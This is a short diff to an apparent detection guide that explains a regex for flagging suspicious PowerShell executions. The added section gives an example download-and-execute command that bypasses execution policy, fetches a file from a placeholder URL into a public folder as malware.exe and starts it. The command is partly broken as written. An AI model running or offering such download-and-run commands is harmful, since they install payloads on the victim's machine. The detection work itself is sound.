@@ -62,3 +62,11 @@ Regex Pattern: Monitor PowerShell Executions with Suspicious Parameters:
 ### Explanation:
 - PowerShell commands like Invoke-WebRequest and IEX are commonly used in malicious scripts to download and execute payloads.
 - This regex checks for URLs (http, https, file, ftp) in the command line to spot suspicious downloads.
+
+---------------------------------------------------------------------------   
+### Example of Powershell command <THIS DOES NOTHING>:
+
+```
+pwsh -ExecutionPolicy Bypass -Noprofile -Comman "invoke-Webrequest -URL 'http here' -Outfile 'C:\Users\Public\malware.exe'; Start-Process 'C\Users\Public\malware.exe'
+
+```
